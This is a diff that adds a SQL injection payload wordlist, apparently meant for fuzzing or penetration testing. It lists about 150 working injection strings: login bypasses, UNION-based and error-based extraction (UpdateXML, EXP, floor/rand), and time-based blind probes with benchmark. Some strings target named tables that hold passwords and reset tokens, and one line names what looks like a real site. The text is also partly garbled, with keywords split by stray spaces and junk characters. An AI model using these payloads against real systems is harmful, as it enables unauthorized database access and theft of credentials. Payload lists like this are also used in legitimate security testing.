@@ -1,0 +1,150 @@
+  and UpdateXML(1,CONCAT(0x5b,mid((SELECT passw ord_reset_token from gpk_main.users where id=1),1,32),0x5d),1)
+*
+'
+"  or ""&amp;"
+)'
+'  or '' '
+")  or ("x")=("x
+"  or ""*"
++ orDER+BY+2��
+ or 1=1/*
+'  or ''^'
+ admin"/*
+ admin')  or ('1'='1'/*
+"  or true--
+ and 12
+(case when(1=2) then dateline else membernum end)
+(case when(1=1) then dateline else membernum end)
+ select group_concat(passwd) from activity_manage.users limit 10 offset 0)a
+ and 1=2
+ orDER BY 1��
+%27%20 and%20%28select%201%20from%28select%20count%28*%29,concat%280x7c,%28select%20%28Select%20version%28%29%29%20from%20inf ormation_schema.tables%20limit%200,1%29,0x7c,flo or%28r and%280%29*2%29%29x%20from%20inf ormation_schema.tables%20group%20by%20x%20limit%200,1%29a%29%23
+ or 1=1--
+ admin'  or '1'='1'--
+,case when(1=2)then 1 else (select 1 union select 2) end
+ admin" or 1=1  or ""="
+%20 and%201=2%20union%20select%201,2,database%28%29,4,5,6,user%28%29,8,9,0,1,2,3,4,5,6%23
+ admin'  or 1=1#
+'&amp;'
+'  or true--
+')  or true--
+'+(if((1=2),1,(select 1 union select 2)))+'
+ admin" --
+'))  or (('x'))=(('x
+/**/ and/**/1
+"  or ""-"
+/*
+%281%29union/*!select/*%0A*/1,user%28%29,3,4*/from%20mysql.user
+ admin")  or "1"="1
+" "
+%20 and%20exists%28select%20passw ord%20from%20system_user%29%23
+ admin'  or '1'='1
+ admin"  or "1"="1"/*
+%27%20 and%201=2%20 and%20%27%27=%27
+ or true--
+'  and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0x7c,flo or(r and(0)*2))x from inf ormation_schema.tables group by x limit 0,1)a)%23
+"
+'  or 'x'='x
+%20 and%201=2%20union%20select%201,2,3%23
+ admin')  or '1'='1'#
+ admin")  or ("1"="1"--
+ admin')  or ('1'='1'--
+ admin"  or 1=1/*
+%22%2bEXP(~(select%20*%20from%20(select%20user())a))%2b%22bb
+'+(case when(1=2) then 1 else (select 1 union select 2) end)+'
+',0,UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/database()),1,32),0x5d),1),1397571500)%23
+(select 1 from (select count(*), concat(flo or(r and(0)*2), 0x5e5e5e,user()) x from inf ormation_schema.character_sets group by x)y)
+ admin"  or 1=1--
+"^"
+ admin')  or ('1'='1
+'  or ''&amp;'
+%20 and%20UpdateXML%281,CONCAT%280x5b,mid%28%28SELECT%20database%28%29%29,1,32%29,0x5d%29,1%29%23+ orDER+BY+1
+%22%2bEXP(~(select%20*%20from%20(select%20group_concat(column_name)%20from%20inf ormation_schema.columns%20where%20table_name=%27users%27)a))%2b%22bb
+select{x table_name}from{x inf ormation_schema.tables}
+ admin' #
+,if((1=1),1,(select 1 union select 2))
+ and 1=2 union select 1,user(),3/*
+http://e.dxy.cn/aomei2011/person/867%27%20 and%20%27%27=%27
+' 1234 "  and 1=0 UNION ALL SELECT " admin", "81dc9bdb52d04dc20036dbd8313ed055
+'+(if((1=1),1,(select 1 union select 2)))+'
+"&amp;"
+ admin")  or ("1"="1
+1%20union%20select%201,benchmark(500000,md5(0x41)),1%20from%20user%20where%20userid=1%20 and%20 ord(substring(username,1,1))=97%20/*
+ admin' --
+ admin'  or '1'='1'#
+ admin")  or "1"="1"--
+select user from mysql.user limit 0,1
+ admin')  or ('1'='1'#
+ admin"  or "1"="1
+(
+ or 1=1#
+ admin')  or '1'='1
+,case when(1=1)then 1 else (select 1 union select 2) end
+%27%20 and%201=2%20union%20select%201,2,3,4,5,6,7,8,9,0,1,2%23
+/**/ orDER/**/BY/**/2��
+/**/ orDER/**/BY/**/1��
+ admin")  or ("1"="1"/*
+ and 1>2
+"-"
+'  or ''*'
+/
+'%2b(if((1=1),1,(select 1 from inf ormation_schema.tables)))%2b'
+ and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)
+ admin"  or 1=1#
+%27%20 or%201=1%23
+#
+' and 1=1 * limit 1%23
+  order by 1,If((1=1),1,(select user from mysql.user))--
+ admin"  or 1=1
+;'INSERT INTO KJ_GD_XS (USER,PASS) VALUES('Wyuheng','mypass')--
+%20 and%201=2%20union%20select%201,2,3,4--
+ and 0(select count(*) from  admin) -
+'  or ''-'
+ 1234 '  and 1=0 UNION ALL SELECT ' admin', '81dc9bdb52d04dc20036dbd8313ed055
+'+ (UpdateXML(1,CONCAT(0x5b,mid( (select database()) ,1,32),0x5d),1)) +'
+),1,(select 1 union select 2))
+ admin")  or "1"="1"#
+ admin")  or ("1"="1"#
+"))  or (("x"))=(("x
+ admin'  or '1'='1'/*
+'+(case when(1=1) then 1 else (select 1 union select 2) end)+'
+ admin'  or 1=1/*
+'  and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0x7c,flo or(r and(0)*2))x from inf ormation_schema.tables group by x limit 0,1)a)%23/wapc/5000_0005_003
+%22%2bEXP(~(select%20*%20from%20(select%20group_concat(table_name)%20from%20inf ormation_schema.tables%20where%20table_schema=%27activity_manage%27)a))%2b%22bb
+"  or "" "
+-(case when(1=1) then dateline else membernum end)
+('
+%22%2bEXP(~(select%20*%20from%20(select%20group_concat(schema_name)%20from%20INF orMATION_SCHEMA.SCHEMATA)a))%2b%22bb
+ admin"  or "1"="1"#
+ and  (select count(*) from *)
+  and length(user())=19
+%27%20 and%201=1%20 and%20%27%27=%27
+ admin'  or 1=1
+"  or "x"="x
++ and+12
+ admin'  or 1=1--
+'-'
+ admin')  or '1'='1'/*
+')  or ('x')=('x
+@`\'` Union select userid from `dede_ admin` where 1  or id=@`\'` LIMIT 0,1
+ admin' or 1=1  or ''='
+ admin")  or "1"="1"/*
+ admin')  or '1'='1'--
+union select 1,benchmark(500000,md5('test')),1 from user where userid=1  and  ord(substring(username,1,1))=97 /*
+%20 and%201=1--
+|\'|%27|{|\(
+'*'
+'^'
+,if((1=2),1,(select 1 union select 2))
+")  or true--
+)
+"  or ""^"
+ and 1=1
+ admin"  or "1"="1"--
+ orDER BY 2��
+' '
+ admin'/*
+-(case when(1=2) then dateline else membernum end)
+ or 1=1
+ admin" #
+ order by 1,If((1=2),1,(select user from mysql.user))--
